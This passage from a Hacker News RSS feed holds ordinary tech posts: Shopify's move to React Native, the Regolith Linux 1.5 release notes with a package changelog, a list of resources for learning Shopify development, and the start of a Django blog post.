href="https://developers.ibexa.co/content-root/blog/running-a-node.js-application-on-ibexa-cloud">Node.js apps&nbsp;that also run on Ibexa Cloud</a>, but increasingly as cloud functions like <a href="https://docs.microsoft.com/en-us/azure/azure-functions/functions-overview" title="">Azure Functions</a> or <a href="https://aws.amazon.com/lambda/" title="">AWS Lambda</a>.</p><p>As a melting pot of data and services a Digital Experience Platform needs to be able to interface with everything. This is why it is good for <a href="https://developers.ibexa.co/content-root/success-stories">our clients</a>, <a href="https://developers.ibexa.co/content-root/partners">partners</a> and us to be aware of&nbsp;emerging technologies. Integrations are key for <a href="https://developers.ibexa.co/content-root/blog/the-mid-enterprise-market-guide-to-digital-experience-platforms">DXPs</a>&nbsp;and Deno could be a contender in that space in the near future. And even if it is not, you always learn by&nbsp;studying&nbsp;alternative solutions to problems. Even the ones you choose not to go for.</p>
</div></div>]]>
            </description>
            <link>https://developers.ibexa.co/blog/deno-is-the-same-as-node.js-but-different</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067625</guid>
            <pubDate>Thu, 12 Nov 2020 08:11:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[React Native Is the Future of Mobile at Shopify]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067617">thread link</a>) | @hijklmno
<br/>
November 12, 2020 | https://shopify.engineering/react-native-future-mobile-shopify | <a href="https://web.archive.org/web/*/https://shopify.engineering/react-native-future-mobile-shopify">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
  <p>After years of native mobile development, we’ve decided to go full steam ahead building all of our new mobile apps using React Native. As I’ll explain, that decision doesn’t come lightly.</p>
<p>Each quarter, the majority of buyers purchase on mobile (with 71% of our buyers purchasing on mobile in Q3 of last year). Black Friday and Cyber Monday (together, BFCM) are the busiest time of year for our merchants, and buying activity during those days is a bellwether. During this year’s BFCM, Shopify merchants saw another 3% increase in purchases on <a href="https://news.shopify.com/shopify-merchants-break-records-with-29-billion-in-worldwide-sales-over-black-fridaycyber-monday-weekend" target="_blank" title="Shopify merchants break records with $2.9+ billion in worldwide sales over Black Friday/Cyber Monday weekend" rel="noopener noreferrer">mobile, an average of 69% of sales</a>.</p>
<p>So why the switch to React Native? And why now? How does this fit in with our native mobile development? It’s a complicated answer that’s best served with a little background.</p>

<p>We have an engineering culture at Shopify of making specific early technology bets that help us move fast.</p>
<p>On the whole, we prefer to have few technologies as a foundation for engineering. This provides us multiple points of leverage:</p>
<ul>
<li>we build <em>extremely</em> specific expertise in a small set of deep technologies (we often become core contributors)</li>
<li>every technology choice has quirks, but we learn them intimately</li>
<li>those outside of the initial team contribute, transfer and maintain code written by others</li>
<li>new people are onboarded more quickly.</li>
</ul>
<p>At the same time, there are always new technologies emerging that provide us with an opportunity for a step change in productivity or capability. We experiment a lot for the opportunity to unlock improvements that are an order of magnitude improvement—but ultimately, we adopt few of these for our core engineering.</p>
<p>When we do adopt these early languages or frameworks, we make a calculated bet. And instead of shying away from the risk, we meticulously research, explore and evaluate such risks based on our unique set of conditions. As is often within risky areas, the unexplored opportunities are hidden. We instead think about how we can mitigate that risk:</p>
<ul>
<li>what if a technology stops being supported by the core team?</li>
<li>what if we run into a bug we can’t fix?</li>
<li>what if the product goes in a direction against our interests?</li>
</ul>
<p>Ruby on Rails was a nascent and obscure framework when Tobi (our CEO) first got involved as a <a href="https://github.com/tobi" target="_blank" title="Tobi on GitHub" rel="nofollow noopener noreferrer">core contributor</a> in 2004. For years, Ruby on Rails has been seen as a non-serious, <a href="https://m.signalvnoise.com/ruby-has-been-fast-enough-for-13-years/" target="_blank" title="Ruby has been fast enough for 13 years - Signal vs. Noise" rel="nofollow noopener noreferrer">non-performant</a> language choice. But that early bet gave Shopify the momentum to outperform the competition even though it was not a popular technology choice. By using Ruby on Rails, the team was able to build faster and attract a different set of talent by using something more modern and with a higher level of abstraction than traditional programming languages and frameworks. <a href="http://www.paulgraham.com/avg.html" target="_blank" title="Beating the Averages - PaulGraham.com" rel="nofollow noopener noreferrer">Paul Graham talks about his decision to use Lisp in building Viaweb to similar effect</a>&nbsp;and <a href="https://twitter.com/mhartl/status/1179561691857616896" target="_blank" title="Michael Hartl on Twitter" rel="nofollow noopener noreferrer">6 of the 10 most valuable Y Combinator companies today all use Ruby on Rails (even though again, it still remains largely unpopular)</a>. As a contrast, none of the Top 10 most valuable Y Combinator companies use Java; largely considered the battle tested enterprise language.</p>
<p>Similarly two years ago, Shopify decided to make the jump to <a href="https://engineering.shopify.com/blogs/engineering/shopify-infrastructure-collaboration-with-google" target="_blank" title="Shopify’s Infrastructure Collaboration with Google" rel="noopener noreferrer">Google Cloud</a>.&nbsp;<span>Again, a scary proposition for the 3rd largest US Retail eCommerce site in 2019—to do a cloud migration away from our own data centers, but to also pick an early cloud contender.&nbsp;</span>We saw the technology arc of value creation moving us to focusing on what we’re good at—enabling entrepreneurship and letting others (in this case Google Cloud) focus on the undifferentiated heavy lifting of maintaining physical hardware, power, security, the operating system updates, etc.</p>
<h2>What is React Native?</h2>
<p>In 2015, <a href="https://www.youtube.com/watch?v=KVZ-P-ZI6W4" target="_blank" title="React.js Conf 2015 Keynote - Introducing React Native" rel="nofollow noopener noreferrer">Facebook announced</a> and open sourced <a href="https://facebook.github.io/react-native/" target="_blank" title="React Native" rel="nofollow noopener noreferrer">React Native</a>; it was already being used internally for their mobile engineering. React Native is a framework for building native mobile apps using <a href="https://reactjs.org/" target="_blank" title="ReactJS" rel="nofollow noopener noreferrer">React</a>. This means you can use a best-in-class JavaScript library (React) to build your native mobile user interfaces.</p>
<p>At Shopify, the idea had its skeptics at the time (and still does), but many saw its promise. At the company’s next <a href="https://twitter.com/ShannonKarleen/status/1204881060213002240?s=20" target="_blank" title="Shannon Gallagher on Twitter" rel="nofollow noopener noreferrer">Hackdays</a>&nbsp;the entire company spent time on React Native. While the early team saw many benefits, they decided that we couldn’t ship an app we’d be proud of using React Native in 2015. For the most part, this had to do with performance and the absence of first-class Android support. What we did learn was that we liked the <a href="https://en.wikipedia.org/wiki/Reactive_programming" target="_blank" title="Reactive Programming - Wikipedia" rel="nofollow noopener noreferrer">Reactive programming</a> model and <a href="https://help.shopify.com/en/api/getting-started/shopify-and-graphql/graphql-benefits" title="GraphQL Benefits" target="_blank" rel="noopener noreferrer">GraphQL</a>. Also, we built and open-sourced a&nbsp;<a href="https://github.com/Shopify/FunctionalTableData" target="_blank" title="FunctionalTableData on GitHub" rel="nofollow noopener noreferrer">functional rendere</a>r for iOS after working with React Native. We adopted these technologies in 2015 for our native mobile stack, but not React Native for mobile development en masse. <a href="https://www.theglobeandmail.com/report-on-business/how-shopify-finally-got-smart-about-mobile/article33184093/" target="_blank" title="Shopify Grows Up" rel="nofollow noopener noreferrer">The Globe and Mail documented our aspirations</a> in a comprehensive story about the first version of our mobile apps.</p>
<p>Until now, the standard for all mobile development at Shopify was native mobile development. We built <a href="https://engineering.shopify.com/blogs/engineering/tagged/mobile-tooling" target="_blank" title="Mobile Tooling on Shopify Engineering" rel="noopener noreferrer">mobile tooling and foundations</a> teams focused on iOS and Android helping accelerate our development efforts. While these teams and the resulting applications were all successful, there was a suspicion that we could be more effective as a team if we could:</p>
<ul>
<li>bring the power of JavaScript and the web to mobile</li>
<li>adopt a reactive programming model across all client-side applications</li>
<li>consolidate our iOS and Android development onto a single stack.</li>
</ul>
<h3>How React Native Works</h3>
<p>React Native provides a way to build native cross platform mobile apps using JavaScript. React Native is similar to React in that it allows developers to create declarative user interfaces in JavaScript, for which it internally creates a hierarchy tree of UI elements or in React terminology a virtual DOM. Whereas the output of ReactJS targets a browser, React Native translates the virtual DOM into mobile native views using platform native bindings that interface with application logic in JavaScript. For our purposes, the target platforms are Android and iOS, but community driven effort have brought React Native to other platforms such as Windows, macOS and Apple tvOS.</p>
<p><img alt="ReactJS targets a browser, whereas React Native can can target mobile APIs." data-src="//cdn.shopify.com/s/files/1/0779/4361/files/React_Native_Blog_Post_2.jpg?v=1580316281" src="https://cdn.shopify.com/s/files/1/0779/4361/files/React_Native_Blog_Post_2.jpg?v=1580316281"></p>

<p><em>ReactJS targets a browser, whereas React Native can target mobile APIs.</em></p>
<h3>When Will We Not Default to Using React Native?</h3>
<p>There are situations where React Native would not be the default option for building a mobile app at Shopify. For example, if we have a requirement of:</p>
<ul>
<li>deploying on older hardware (CPU &lt;1.5GHz)</li>
<li>extensive processing</li>
<li>ultra-high performance</li>
<li>many background threads.</li>
</ul>
<p>Reminder: Low-level libraries including many open sourced SDKs will remain purely native. And we can always create our own native modules when we need to be close to the metal.</p>
<h3>Why Move to React Native Now?</h3>
<p>There were 3 main reasons now is a great time to take this stance:</p>
<ol>
<li>we learned from our acquisition of Tictail (a mobile first company that focused 100% on React Native) in 2018 how far React Native has come and made 3 deep product investments in 2019</li>
<li>Shopify uses React extensively on the web and that know-how is now transferable to mobile</li>
<li>we see the performance curve bending upwards (think what’s now possible in Google Docs vs. desktop Microsoft Office) and we can long-term invest in React Native like we do in Ruby, Rails, Kubernetes and Rich Media.</li>
</ol>

<p>We have many mobile surfaces at Shopify for buyers and merchants to interact, both over the web and with our mobile apps. We spent time over the last year experimenting with React Native with three separate teams over three apps: Arrive, Point of Sale, and Compass.</p>
<p>From our experiments we learned that:</p>
<ul>
<li>in rewriting the Arrive app in React Native, the team felt that they were twice as productive than using native development—even just on one mobile platform</li>
<li>testing our Point of Sale app on low-power configurations of Android hardware let us set a lower CPU threshold than previously imagined (1.5GHz vs. 2GHz)</li>
<li>we estimated ~80% code sharing between iOS and Android, and were surprised by the extremely high-levels in practice—95% (Arrive) and 99% (Compass)</li>
</ul>
<p>As an aside, even though we’re making the decision to build all new apps using React Native, that doesn’t mean we’ll automatically start rewriting our old apps in React Native.</p>
<h2>Arrive</h2>
<p>At the end of 2018, we decided to rewrite one of our most popular consumer apps, <a href="https://tryarrive.com/" target="_blank" title="Arrive by Shopify" rel="nofollow noopener noreferrer">Arrive</a> in React Native. Arrive is no slouch, it’s a highly rated, high performing app that has millions of downloads on iOS. It was a good candidate because we didn’t have an Android version. Our efforts would help us reach all of the Android users who were clamoring for Arrive. It’s now React Native on both iOS and Android and shares 95% of the same code. We’ll do a deep dive into Arrive in a future blog post.</p>
<p>So far this rewrite resulted in:</p>
<ul>
<li>less crashes on iOS than our native iOS app</li>
<li>an Android version launched</li>
<li>team composed of mobile + non-mobile developers.</li>
</ul>
<p>The team also came up with this cool way to instantly test work-in-progress pull requests. You simply scan a QR code from an automated GitHub comment on your phone and the JavaScript bundle is updated in your app and you’re now running the latest code from that pull request. JML, <a href="https://twitter.com/jmwind/status/1185268708383645698?s=20" target="_blank" title="JML on Twitter" rel="nofollow noopener noreferrer">our CTO, shared the process on Twitter recently</a>.</p>
<h2>Point of Sale</h2>
<p>At the beginning of 2019, we did a 6-week experiment on our flagship <a href="https://www.shopify.ca/pos" target="_blank" title="Shopify POS" rel="noopener noreferrer">Point of Sale (POS) app</a> to see if it would be a good candidate for a rewrite in React Native. We learned a lot, including that our retail merchants expect almost 2x the responsiveness in our POS due to the muscle memory of using our app while also talking to customers.</p>
<p>In order to best serve our retail merchants and learn about React Native in a physical retail setting, we decided to build out the new POS natively for iOS and use React Native for Android.</p>
<p>We went ahead with 2 teams for the following reasons:</p>
<ol>
<li>we already had a team ramped up with iOS expertise, including many of the folks that built the original POS apps</li>
<li>we wanted to be able to benchmark our React Native engineering velocity as well as app performance against the gold standard which is native iOS</li>
<li>to meet the high performance requirements of our merchants, we felt that we’d need all of the <a href="https://github.com/react-native-community/discussions-and-proposals/issues/4" target="_blank" title="React Native Fabric (UI-Layer Re-architecture) on GitHub" rel="nofollow noopener noreferrer">Facebook …</a></li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://shopify.engineering/react-native-future-mobile-shopify">https://shopify.engineering/react-native-future-mobile-shopify</a></em></p>]]>
            </description>
            <link>https://shopify.engineering/react-native-future-mobile-shopify</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067617</guid>
            <pubDate>Thu, 12 Nov 2020 08:09:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Release Notes for Regolith 1.5]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067509">thread link</a>) | @pedrokost
<br/>
November 11, 2020 | https://regolith-linux.org/docs/reference/releases/regolith-1.5-release-notes/ | <a href="https://web.archive.org/web/*/https://regolith-linux.org/docs/reference/releases/regolith-1.5-release-notes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
	<p>Release notes for Regolith 1.5.</p>
	<p>Regolith R1.5 is a feature release which includes several improvements and optimizations.  To summarize, Regolith 1.5 ships simpler workspace management, a Rofi-based Look switcher, and numerous internal optimizations and cleanup.  Read below for more details.</p>
<h2 id="known-issues">Known Issues</h2>
<p>Issues and fixes are being tracked in <a href="https://github.com/orgs/regolith-linux/projects/13">this project</a>.</p>
<h2 id="features">Features</h2>
<table>
    <tbody>
        <tr>
            <td>Next Free Workspace</td>
            <td colspan="2">A typical part of managing workspaces in an i3-based desktop is moving to unused workspaces and then loading some applications. Before this feature, a user has to determine which unused workspace they prefer.  This is done by scanning the list of existing used workspaces to determine an unused one. Now, the system can do this automatically.  The <span><span>super</span> <span>`</span></span> keybinding will move to the next free workspace.  <span><span>super</span> <span>alt</span> <span>`</span></span> will move the focused window into the next free workspace.</td>
        </tr>
        <tr>
            <td>View and Change Looks via Rofi</td>
            <td><a href="https://regolith-linux.org/docs/reference/releases/regolith-select-look.png"><img width="640px" src="https://regolith-linux.org/docs/reference/releases/regolith-select-look.png"></a></td>
            <td>Looks can be changed now via a Rofi dialog rather than having to configure the Xresource override via the command-line.  To do this, use keybinding `<super>-<alt>l` and then select from the dialog to load a Look.</alt></super></td>
        </tr>
        <tr>
            <td>GSettings Overrides</td>            
            <td colspan="2">Regolith now uses [gsettings overrides](https://help.gnome.org/admin/system-admin-guide/stable/overrides.html.en) to configure various GNOME settings for use with Regolith.  In previous versions of Regolith, settings were written globally to the user session from within the Regolith startup code.  This could cause issues if the user works in multiple desktop environments.  Now, Regolith GNOME settings are defined in an override file that is only in effect while using a Regolith session.  This allows switching between desktop environments without settings from Regolith impacting other environments.</td>
        </tr>
        <tr>
            <td>New Looks</td>
            <td>
              <a href="https://regolith-linux.org/docs/reference/releases/regolith-dracula.png"><img width="640px" src="https://regolith-linux.org/docs/reference/releases/regolith-dracula.png">
              </a><a href="https://regolith-linux.org/docs/reference/releases/regolith-gruvbox.png"><img width="640px" src="https://regolith-linux.org/docs/reference/releases/regolith-gruvbox.png">
              </a><a href="https://regolith-linux.org/docs/reference/releases/regolith-pop-os.png"><img width="640px" src="https://regolith-linux.org/docs/reference/releases/regolith-pop-os.png">
            </a></td>
            <td>Users have contributed some new Looks to Regolith: dracula, gruvbox, and pop-os.  Each of these looks presents a distinctive color palate, typeface, and GTK theme.</td>
        </tr>
        <tr>
            <td>i3-gaps upgraded to 4.18.2</td>
            <td colspan="2">See i3-gaps <a href="https://github.com/Airblader/i3/blob/a4a1a44275ea402b25d2d1365e1163e496024358/RELEASE-NOTES-4.18.2">release notes here</a>.</td>
        </tr>
        <tr>
            <td>More Refined Customizations</td>
            <td colspan="2">Numerous small changes allow more granular system customization, such as specifying the temperature unit, custom Compositor settings, and a more comprehensive way of changing i3 keybindings without having to copy the entire config file.</td>
        </tr>
        <tr>
            <td>More Desktop Environment Packages</td>
            <td colspan="2">The following packages can be installed in place of <code>regolith-desktop</code> for specific sets of packages based on user needs: <code>regolith-desktop-minimal</code>, <code>regolith-desktop-standard</code>, <code>regolith-desktop-mobile</code>, and <code>regolith-desktop-complete</code></td>
        </tr>
        <tr>
            <td>New default compositor: Picom version 8</td>
            <td colspan="2">See Picom's <a href="https://github.com/yshui/picom/releases">releaes notes here</a>.</td>
        </tr>
        <tr>
            <td>Remontoire upgraded to version 1.4</td>
            <td colspan="2">Includes better multi-monitor support and other bug fixes and enhancements.</td>
        </tr>
        <tr>
            <td>Optional integration with <b>td-cli</b></td>
            <td><a href="https://regolith-linux.org/docs/reference/releases/regolith-td.png"><img width="640px" src="https://regolith-linux.org/docs/reference/releases/regolith-td.png"></a></td>
            <td>Access a simple todo app via Rofi.</td>
        </tr>
        <tr>
            <td>Documentation of development process.</td>
            <td colspan="2">The <a href="https://regolith-linux.org/docs/policy-and-process/development/">Regolith development process</a> is now better documented to enable greater transparency and inclusion.</td>
            <td></td>
        </tr>
      
    </tbody>
</table>
<h2 id="fixes">Fixes</h2>
<p>Have a look at the R1.5 project page for a <a href="https://github.com/orgs/regolith-linux/projects/12">list of bug fixes</a>.</p>
<h2 id="changelog-delta-from-regolith-141-to-regolith-15">Changelog Delta from Regolith 1.4.1 to Regolith 1.5</h2>
<pre><code>########################################
# Release Notes for dracula-gtk
########################################
dracula-gtk (1.0.1-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Remove unnecessary files


dracula-gtk (1.0-1) bionic; urgency=medium

  * [ Ken Gilmer ]
  * Packaging version add4f8c 

########################################
# Release Notes for fonts-materialdesignicons-webfont
########################################
fonts-materialdesignicons-webfont (1.6.50-3regolith3) bionic; urgency=medium

  * Backporting to bionic for Regolith. 


########################################
# Release Notes for gruvbox-gtk
########################################
gruvbox-gtk (1.0.1-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Rename root directory of theme to Gruvbox for consistency w/ other GTK themes.
  * Add gbp config for package management.


gruvbox-gtk (1.0-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * New upstream version 1.0


gruvbox-gtk (1.0-1) bionic; urgency=medium

  [ eximus ]
  * Initial commit
  * gruvbox theme


########################################
# Release Notes for i3-gaps-wm
########################################
i3-gaps-wm (4.18.2-1~regolith2) bionic; urgency=medium

  * Package source from upstream https://github.com/Airblader/i3/releases/tag/4.18.2


########################################
# Release Notes for i3ipc-python
########################################
i3ipc-python (2.1.1-1ubuntu1~ppa6) bionic; urgency=medium

  * Update build dependencies hoping to resolve packaing problems. 



########################################
# Release Notes for i3xrocks
########################################
i3xrocks (1.3.4-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Version bump to match changelog.  Cleanup.


i3xrocks (1.3.3-1) bionic; urgency=medium

  [ Will Winder ]
  * Add optional default resource value.
  * Minor cleanup.
  * Free resource allocated by xcb_xrm_resource_get_string
  * Fix possible truncated resource value.

  [ Ken Gilmer ]
  * Add gbp config file


########################################
# Release Notes for picom
########################################
picom (8-1~1.gbp353272ubuntu1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Remove github files from debian branch.


picom (8-1~1.gbp353272) bionic; urgency=medium

  [ Ken Gilmer ]
  * New upstream version 8


########################################
# Release Notes for plano-theme
########################################
plano-theme (3.36-1-1regolith1) bionic; urgency=medium

  [ Ken Gilmer ]
  * New upstream version 3.36-1


########################################
# Release Notes for plymouth-theme-regolith
########################################
plymouth-theme-regolith (1.0.3-1) focal; urgency=medium

  * Tweaks to config files. 


plymouth-theme-regolith (1.0.2-1) focal; urgency=medium

  * Ship grub file. 


plymouth-theme-regolith (1.0.1-1) focal; urgency=medium

  * Add package hooks. 



########################################
# Release Notes for pop-fonts
########################################
pop-fonts (1.0.3~1555617065~18.04~a86eb73) bionic; urgency=medium

  * Auto Build

########################################
# Release Notes for python3-i3ipc
########################################
python3-i3ipc (2.1.1-1ubuntu1~ppa7) bionic; urgency=medium

  * Changes to python version.


i3ipc-python (2.1.1-1ubuntu1~ppa6) bionic; urgency=medium

  * Update build dependencies hoping to resolve packaing problems. 


i3ipc-python (2.1.1-1ubuntu1~ppa4) eoan; urgency=medium

  * Add python-xlib dependency. 


i3ipc-python (2.1.1-1ubuntu1~ppa2) eoan; urgency=medium

  * Initial release from https://github.com/altdesktop/i3ipc-python/archive/v2.1.1.tar.gz.


########################################
# Release Notes for regolith-compositor-compton-glx
########################################
regolith-compositor-compton-glx (1.1.0-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Init script will kill pre-existing app instance before starting new. Part of fix for https://github.com/regolith-linux/regolith-desktop/issues/475.


regolith-compositor-compton-glx (1.0.10-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Fix typo in compton config file, found by @gservat.


regolith-compositor-compton-glx (1.0.9-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Add xrender-sync-fence to handle issue https://github.com/regolith-linux/regolith-desktop/issues/116.


regolith-compositor-compton-glx (1.0.8-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Ship config file.


regolith-compositor-compton-glx (1.0.7-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Add gbp conf file, cleanup.



########################################
# Release Notes for regolith-compositor-none
########################################
regolith-compositor-none (1.0.3-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Add gbp conf file, cleanup.



########################################
# Release Notes for regolith-compositor-picom-glx
########################################
regolith-compositor-picom-glx (1.1.1-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Fix typo found in https://github.com/regolith-linux/regolith-compositor-picom-glx/issues/1.
  * Init script will kill pre-existing app instance before starting new. Part of fix for https://github.com/regolith-linux/regolith-desktop/issues/475.


regolith-compositor-picom-glx (1.0.1-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Fix typo found in 
  https://github.com/regolith-linux/regolith-compositor-picom-glx/issues/1.


regolith-compositor-picom-glx (1.0.0-1) bionic; urgency=medium

  * Initial release


########################################
# Release Notes for regolith-compositor-xcompmgr
########################################
regolith-compositor-xcompmgr (1.2.0-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Init script will kill pre-existing app instance before starting new. Part of fix for https://github.com/regolith-linux/regolith-desktop/issues/475.


regolith-compositor-xcompmgr (1.1.0-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Add ability to override xcompmgr defaults. Fixes https://github.com/regolith-linux/regolith-desktop/issues/382.


regolith-compositor-xcompmgr (1.0.3-1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Add gbp conf file, cleanup.



########################################
# Release Notes for regolith-default-settings
########################################
regolith-default-settings (1.0-1bionic1) bionic; urgency=medium

  [ Ken Gilmer ]
  * Add bionic specific gsettings overrides.


regolith-default-settings (1.0-1) focal; urgency=medium

  * Initial release, files moved from package regolith-gnome-flashback.


########################################
# Release Notes for regolith-desktop
########################################
regolith-desktop (2.78-1bionic) bionic; urgency=medium

  [ Ken Gilmer ]
  * Move from compton to picom as default compositor.

</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://regolith-linux.org/docs/reference/releases/regolith-1.5-release-notes/">https://regolith-linux.org/docs/reference/releases/regolith-1.5-release-notes/</a></em></p>]]>
            </description>
            <link>https://regolith-linux.org/docs/reference/releases/regolith-1.5-release-notes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067509</guid>
            <pubDate>Thu, 12 Nov 2020 07:51:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Become a Shopify Developer – Resources to Become a Shopify Dev]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25067407">thread link</a>) | @iliashad
<br/>
November 11, 2020 | https://iliashaddad.com/blog/how-to-become-shopify-developer | <a href="https://web.archive.org/web/*/https://iliashaddad.com/blog/how-to-become-shopify-developer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><div><article><div><p><span>
      <a href="https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/af240/how-to-become-shopify-developer-0.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="how to become shopify developer 0" title="how to become shopify developer 0" src="https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/0a251/how-to-become-shopify-developer-0.jpg" srcset="https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/bce2d/how-to-become-shopify-developer-0.jpg 250w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/953fe/how-to-become-shopify-developer-0.jpg 500w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/0a251/how-to-become-shopify-developer-0.jpg 1000w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/e3932/how-to-become-shopify-developer-0.jpg 1500w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/451a4/how-to-become-shopify-developer-0.jpg 2000w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/af240/how-to-become-shopify-developer-0.jpg 2600w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
  </a>
    </span></p><p>Shopify has been growing so fast in the last couple of years. “We made history in 2018: no other SaaS company has crossed the $1 billion-dollar revenue mark at a faster growth rate than Shopify has,” said <a href="https://investors.shopify.com/Investor-News-Details/2019/Shopify-Announces-Fourth-Quarter-and-Full-Year-2018-Financial-Results/default.aspx">Tobi Lütke</a></p><p>I’m a self-taught developer who worked as a freelancer and indie maker in 2019 and I learned Shopify app and theme development and I want to share with you resources that help me to become a Shopify developer</p><h3><strong>Prerequisite to learn Shopify Theme Development&nbsp;:</strong></h3><p>Shopify theme is like WordPress themes but Shopify use their markup language (Liquid ) instead of PHP</p><p>You need to</p><ul><li>have basic knowledge with HTML5, CSS3, and JavaScript</li><li>have basic knowledge with jQuey (Many Shopify libraries use jQuery ) — Optional</li><li>have basic knowledge with Command Line</li><li>Create a <a href="https://accounts.shopify.com/signup">Shopify Partner account</a> to upload and test your Shopify theme (Free with unlimited Shopify store for development)</li></ul><h3>Prerequisite to learn Shopify App Development&nbsp;:</h3><p>Shopify app is a web app and you can use any programming language like Ruby, Python, PHP or Node JS to build one and in this guide, I’ll focus on Node JS in this guide</p><p>You need to&nbsp;:</p><ul><li>have basic knowledge with HTML5, CSS3</li><li>a good understanding of JavaScript and React (Shopify Polaris built With React but you can use any framework or just vanilla JS)</li><li>good understanding of how to build a full-stack web application (Authentication, consume external API, Send Requests from the front end and deal with it in the back end )</li><li>have basic knowledge with GraphQL (Shopify API built with GraphQL)</li><li>Create a <a href="https://accounts.shopify.com/signup">Shopify Partner account</a> to create, test and publish your Shopify app (Free)</li></ul><h3>Ressources to learn Shopify Theme Development</h3><ul><li><a href="https://www.shopify.com/partners/blog/">Shopify Partner Blog</a>: Articles and guides about design inspiration, Shopify development tips</li><li><a href="https://www.shopify.com/partners/academy">Shopify Partner Academy</a>: Free courses from Shopify team to learn how to work with Shopify tools</li><li><a href="https://www.skillshare.com/classes/Shopify-Essentials-for-Web-Developers-From-Store-Setup-to-Custom-Themes/1070001866/projects">Shopify for web dev</a>elopers: (Free course) Set up your first Shopify store and create your first custom Shopify theme by a Shopify Expert</li><li><a href="https://www.skillshare.com/classes/Advanced-Shopify-Theme-Development/708093439?utm_campaign=video-embed-708093439&amp;utm_source=Video&amp;utm_medium=video-embed">Advanced Shopify</a> Theme: (Free course) Create advanced Shopify theme (Make Shopify theme a single web app using AJAX ) by a Shopify expert</li><li><a href="https://www.shopify.co.uk/partners/shopify-cheat-sheet">Liquid Cheatsheet</a>: Cheatsheet to get all Shopify liquid variables, filters, and helpers</li><li><a href="https://shopify.github.io/liquid-code-examples/">Liquid Code Examples:</a> Collection of code snippets to speed up your development process and understand how to write liquid code</li><li><a href="https://www.youtube.com/playlist?list=PLXQCP3o-w1Pvras8iuflJKO3tfkBT8c0c">Shopify YB Playlist:</a> Youtube course to learn Shopify theme development</li><li><a href="https://shopify.github.io/themekit/">Shopify Theme Kit</a>: a command-line tool to upload your Shopify theme to a Shopify store automatically when changes are made locally</li><li><a href="https://help.shopify.com/en/themes/development">Shopify Theme Docs</a>: Shopify docs to create your Shopify theme</li></ul><h3>Ressources to learn Shopify App Development</h3><ul><li><a href="https://www.shopify.com/partners/blog/">Shopify Partner Blog</a>: Articles and guides about design inspiration, Shopify development tips</li><li><a href="https://www.shopify.com/partners/academy">Shopify Partner Academy</a>: Free courses from Shopify team to learn how to work with Shopify tools</li><li><a href="https://developers.shopify.com/tutorials/build-a-shopify-app-with-node-and-react/set-up-your-app">Shopify React Node App</a>: Tutorial by Shopify team to create your first React and Node JS Shopify app using Polaris (Shopify React design system) and KOA Js to handle server-side rendering</li><li><a href="https://github.com/Shopify/shopify-app-cli">Shopify App CLI:</a> Create your Shopify app like (Create React App), serve your shopify app in Ngrok server (Free) and update your Ngrok server link automatically in your Shopify App dashboard</li></ul><h3>Conclusion</h3><p>Thanks for reading, I wish you the best on your new journey.</p></div></article></div></main></div></div>]]>
            </description>
            <link>https://iliashaddad.com/blog/how-to-become-shopify-developer</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067407</guid>
            <pubDate>Thu, 12 Nov 2020 07:32:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I learned Django so well – Blog post]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067291">thread link</a>) | @codewithstein
<br/>
November 11, 2020 | https://codewithstein.com/how-i-learned-django-so-well/ | <a href="https://web.archive.org/web/*/https://codewithstein.com/how-i-learned-django-so-well/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			    	
<div>
    <article itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting">
	

        

        <p>
            <time datetime="20-11-11">Code With Stein / Nov 11, 20 / 0 comments</time>

            /

            
                <a href="https://codewithstein.com/misc/">#Misc</a>
            
        </p>

        <hr>

        <p itemprop="description">
            People of ask me here on YouTube and by e-mail how I have learned Django so well. I thought I could create a video where I explain it to all of you at once.... and here it is.
        </p>

         

        <div itemprop="articleBody">
